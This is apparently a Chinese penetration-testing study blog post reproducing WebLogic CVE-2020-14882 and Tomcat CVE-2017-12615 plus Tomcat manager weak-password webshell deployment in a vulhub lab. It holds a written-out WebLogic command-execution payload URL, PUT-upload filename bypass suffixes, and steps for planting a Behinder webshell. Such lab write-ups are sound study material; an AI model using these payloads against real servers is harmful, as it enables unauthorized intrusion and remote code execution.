{"title":"渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）","date":"2023-03-16T17:42:18.147Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）","updated":"2023-03-17T05:01:01.632Z","content":"<h2 id=\"weblogic未授权访问（cve-2020-14882）\">Weblogic未授权访问（CVE-2020-14882）<a title=\"#weblogic未授权访问（cve-2020-14882）\" href=\"#weblogic未授权访问（cve-2020-14882）\"></a></h2>\n<ul>\n<li>\n<p>影响版本：Oracle WebLogic Server，版本10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0</p>\n</li>\n<li>\n<p>环境：Kali2021 / docker / vulhub</p>\n</li>\n</ul>\n<h3 id=\"漏洞复现\">漏洞复现<a title=\"#漏洞复现\" href=\"#漏洞复现\"></a></h3>\n<p>未授权访问绕过后台：IP:7001/console/css/%252e%252e%252fconsole.portal</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051902001.png\" alt=\"image-20220405190209862\" loading=\"lazy\" class=\"φbp\"></p>\n<p>构造payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">IP:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch /tmp/success_shell&#x27;);&quot;)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051929537.png\" alt=\"image-20220405192933421\" loading=\"lazy\" class=\"φbp\"></p>\n<p>查看返回结果</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051930287.png\" alt=\"image-20220405193016175\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功。</p>\n<p>脚本利用：</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051939490.png\" alt=\"image-20220405193934383\" loading=\"lazy\" class=\"φbp\"></p>\n<p>利用成功</p>\n<h2 id=\"tomcat控制台部署war包\">Tomcat控制台部署war包<a title=\"#tomcat控制台部署war包\" href=\"#tomcat控制台部署war包\"></a></h2>\n<ul>\n<li>环境：Kali2021 / docker / vulhub</li>\n</ul>\n<h3 id=\"利用方式\">利用方式<a title=\"#利用方式\" href=\"#利用方式\"></a></h3>\n<p>进入后台</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051954986.png\" alt=\"image-20220405195401833\" loading=\"lazy\" class=\"φbp\"></p>\n<p>弱口令</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051954680.png\" alt=\"image-20220405195433405\" loading=\"lazy\" class=\"φbp\"></p>\n<p>上传准备好的冰蝎马，并打包成zip文件，改后缀为.war</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051959109.png\" alt=\"image-20220405195928877\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204051959019.png\" alt=\"image-20220405195943913\" loading=\"lazy\" class=\"φbp\"></p>\n<p>连接</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204052005443.png\" alt=\"image-20220405200548294\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n<h2 id=\"tomcat远程代码执行（cve-2017-12615）\">tomcat远程代码执行（CVE-2017-12615）<a title=\"#tomcat远程代码执行（cve-2017-12615）\" href=\"#tomcat远程代码执行（cve-2017-12615）\"></a></h2>\n<ul>\n<li>\n<p>环境：kali2021 / docker / vulhub</p>\n</li>\n<li>\n<p>影响版本：tomcat 7.0.0-7.0.81</p>\n</li>\n<li>\n<p>漏洞成因：如果tomcat配置文件中的readonly参数设置为false，则可以通过put上传文件，造成任意代码执行。</p>\n<p>DefaultServlet可以处理PUT请求，但是JspServlet不能处理PUT请求，所以上传jsp需要饶过</p>\n</li>\n<li>\n<p>Tomcat下，DefaultServlet的作用是处理静态文件、jspServlet处理jsp文件，DefaultServlet可以处理PUT请求，但是JspServlet不能处理PUT请求，所以上传jsp需要饶过。绕过方式：</p>\n<ul>\n<li>test.jsp%20\ttomcat7.0.0-7.0.81</li>\n<li>test.jsp:$DATA    tomcat7.0.0-7.0.81</li>\n<li>test.jsp/    任意版本</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"漏洞复现-1\">漏洞复现<a title=\"#漏洞复现-1\" href=\"#漏洞复现-1\"></a></h3>\n<p>刷新页面抓包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204052017257.png\" alt=\"image-20220405201755174\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发送到repeat模块，并更改请求方式为PUT，上传jsp文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204052127334.png\" alt=\"image-20220405205120588\" loading=\"lazy\" class=\"φbp\"></p>\n<p>访问根目录下该文件</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204052130007.png\" alt=\"image-20220405212828811\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n","prev":{"title":"渗透测试笔记 - day45 中间件漏洞（Apache、Nginx、Weblogic）","link":"2023/03/16/渗透测试笔记 - day45 中间件漏洞（Apache、Nginx、Weblogic）"},"next":{"title":"渗透测试笔记 - day38 信息收集","link":"2023/03/16/渗透测试笔记 - day38 信息收集"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）/","toc":[{"id":"weblogic未授权访问（cve-2020-14882）","title":"Weblogic未授权访问（CVE-2020-14882）","index":"1","children":[{"id":"漏洞复现","title":"漏洞复现","index":"1.1"}]},{"id":"tomcat控制台部署war包","title":"Tomcat控制台部署war包","index":"2","children":[{"id":"利用方式","title":"利用方式","index":"2.1"}]},{"id":"tomcat远程代码执行（cve-2017-12615）","title":"tomcat远程代码执行（CVE-2017-12615）","index":"3","children":[{"id":"漏洞复现-1","title":"漏洞复现","index":"3.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）/\" title=\"渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day46 中间件漏洞（Weblogic、Tomcat）/</a>"},"reading_time":"499 words in 3 min"}